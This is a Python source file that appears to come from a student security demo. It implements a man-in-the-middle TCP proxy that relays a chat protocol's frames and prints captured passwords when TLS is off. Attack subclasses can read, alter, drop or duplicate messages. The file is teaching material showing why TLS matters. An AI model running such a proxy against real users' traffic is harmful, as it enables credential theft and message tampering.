"""
proxy_base.py
-------------
A man-in-the-middle TCP proxy used by all three attack scripts.

    client  --->  [ attack proxy :9100 ]  --->  relay server :9000

Clients connect to the PROXY instead of the server. For every client the proxy
opens its own connection to the real server and copies frames both ways.
Each attack script overrides `on_client_frame()` to read / change / drop /
duplicate the envelopes a client sends.

This only works when TLS is OFF (server and clients started with --no-tls).
With TLS on, the proxy only sees encrypted TLS records and can't even parse
the frames - which is exactly why TLS is the first layer of defence.

FOR THE PROJECT DEMO ONLY. Run it only against your own lab setup.
"""

import argparse
import asyncio
import json

from common.envelope import EnvelopeError, parse_envelope
from common.framing import FrameError, recv_frame, send_frame

RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RESET = "\033[0m"


def say(colour, text):
    print(f"{colour}{text}{RESET}", flush=True)


class Connection:
    """One client <-> proxy <-> server pair of sockets."""

    def __init__(self, client_reader, client_writer, server_reader, server_writer):
        self.client_reader = client_reader
        self.client_writer = client_writer
        self.server_reader = server_reader
        self.server_writer = server_writer
        self.username = None  # learned from the HELLO frame

    async def to_server(self, envelope: dict):
        await send_frame(self.server_writer, json.dumps(envelope).encode())

    async def to_client(self, envelope: dict):
        await send_frame(self.client_writer, json.dumps(envelope).encode())


class AttackProxy:
    name = "proxy"

    def __init__(self, listen_port, server_host, server_port):
        self.listen_port = listen_port
        self.server_host = server_host
        self.server_port = server_port
        self.connections = {}  # username -> Connection

    # ------------------------------------------------------------------
    # Override these in each attack
    # ------------------------------------------------------------------
    async def on_client_frame(self, conn: Connection, envelope: dict):
        """
        Called for every envelope a CLIENT sends towards the server.
        Return a list of envelopes to forward (empty list = drop it).
        """
        return [envelope]

    def on_hello(self, conn: Connection, envelope: dict):
        """Without TLS the proxy can read the login - show that."""
        conn.username = envelope.get("from")
        self.connections[conn.username] = conn
        say(YELLOW, f"[{self.name}] {conn.username} logged in through the proxy. "
                    f"Captured password: {envelope.get('password')!r}  (no TLS!)")

    # ------------------------------------------------------------------
    # Plumbing
    # ------------------------------------------------------------------
    async def start(self):
        self.server = await asyncio.start_server(self.handle_client, "0.0.0.0", self.listen_port)
        self.listen_port = self.server.sockets[0].getsockname()[1]
        say(YELLOW, f"[{self.name}] listening on :{self.listen_port}, "
                    f"forwarding to {self.server_host}:{self.server_port}")
        return self.server

    async def stop(self):
        self.server.close()
        await self.server.wait_closed()

    async def handle_client(self, client_reader, client_writer):
        try:
            server_reader, server_writer = await asyncio.open_connection(
                self.server_host, self.server_port)
        except OSError as error:
            say(RED, f"[{self.name}] cannot reach the server: {error}")
            client_writer.close()
            return

        conn = Connection(client_reader, client_writer, server_reader, server_writer)
        upstream = asyncio.create_task(self.pump_client_to_server(conn))
        downstream = asyncio.create_task(self.pump_server_to_client(conn))
        await asyncio.wait([upstream, downstream], return_when=asyncio.FIRST_COMPLETED)
        upstream.cancel()
        downstream.cancel()
        client_writer.close()
        server_writer.close()

    async def pump_client_to_server(self, conn):
        try:
            while True:
                data = await recv_frame(conn.client_reader)
                try:
                    envelope = parse_envelope(data)
                except EnvelopeError:
                    # Not JSON = probably TLS. We can't do anything with it.
                    say(RED, f"[{self.name}] can't read this traffic (is TLS on?) - forwarding blindly")
                    await send_frame(conn.server_writer, data)
                    continue

                if envelope.get("type") == "HELLO":
                    self.on_hello(conn, envelope)
                    await conn.to_server(envelope)
                    continue

                for out in await self.on_client_frame(conn, envelope):
                    await conn.to_server(out)
        except (FrameError, ConnectionError, OSError):
            pass

    async def pump_server_to_client(self, conn):
        try:
            while True:
                data = await recv_frame(conn.server_reader)
                await send_frame(conn.client_writer, data)
        except (FrameError, ConnectionError, OSError):
            pass


def common_args(description):
    parser = argparse.ArgumentParser(description=description)
    parser.add_argument("--listen", type=int, default=9100, help="port clients connect to")
    parser.add_argument("--server-host", default="127.0.0.1")
    parser.add_argument("--server-port", type=int, default=9000)
    return parser


def run(proxy):
    async def main():
        server = await proxy.start()
        async with server:
            await server.serve_forever()
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
